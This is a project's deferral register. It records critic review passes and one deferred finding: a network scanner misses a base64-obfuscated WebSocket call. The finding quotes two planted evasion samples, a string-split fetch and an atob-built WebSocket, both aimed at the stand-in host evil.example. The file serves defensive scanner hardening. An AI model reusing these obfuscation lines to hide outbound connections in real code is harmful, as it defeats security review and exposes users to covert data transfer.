# DEFERRED

Per §21.4: severity-2 findings are fixed unless a written rationale is filed
here. Severity-1 findings are never deferred — they block emit and there is no
override flag.

This file is the register that makes a deferral a deliberate, reviewable act
rather than an omission. A finding that is absent from both the fix log and this
file has been forgotten, not decided.

---

## Critic passes run

| Pass | Report | Axes | Findings | Disposition |
|---|---|---|---|---|
| 1 | `CRITIQUE-1.md` | 6 pass, 5 fail | 7 sev-1, 10 sev-2, 7 sev-3 | **All 24 fixed.** Nothing deferred |
| 2 | `CRITIQUE-2.md` | 9 pass, 2 fail | 1 sev-1, 7 sev-2, 8 sev-3 | In progress — see below |

§21's exit condition is the critic clean on all eleven axes **twice
consecutively**, the second pass against a freshly emitted artifact. Neither
condition is met yet.

---

## Deferred from CRITIQUE-2

### C16 · The network scanner does not see a base64-obfuscated API name

*Severity 3. Deferred pending L10's judgment, which is the correct owner.*

26 of the critic's 27 planted network references were caught, including
`window["fe"+"tch"]("htt"+"ps://evil.example/x")`. The miss:

```js
new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))
```

No token and no URL, so there is nothing for `JS_NETWORK_TOKENS` to match.

**The critic could not find a product path to it and said so.** Planted as a
`raw` `ContentBlock` — which is how a prospect's own obfuscated analytics would
actually arrive — the whole `<script>` is flattened to text by
`src/scene/blocks.js` before the scanner runs, and the base64 payload is absent
from the emitted file. It is a hardening note about a lane API, not a live hole.

The reason this is deferred rather than fixed is that the fix has a real cost and
the threat does not: a base64-decode pass over inline script fires on every
legitimate `atob`, and §1.1's law is enforced by *this* scanner, so a rule that
cries wolf degrades the defence that is working. L10 has been asked to decide and
to record the answer either way. **"We looked at this and chose not to, because
—" is the outcome being sought**, not a fix by default.

---

## Nothing else is deferred

Every other finding in both reports is either fixed or in flight with a named
owner. Where a lane disagreed with a finding, the disagreement is recorded in
`docs/disputes/L<n>-*.md` and indexed in `CONTRACTS-DISPUTES.md`, and the lane
built against the contract as written regardless — which is §4's rule, not a
deferral.
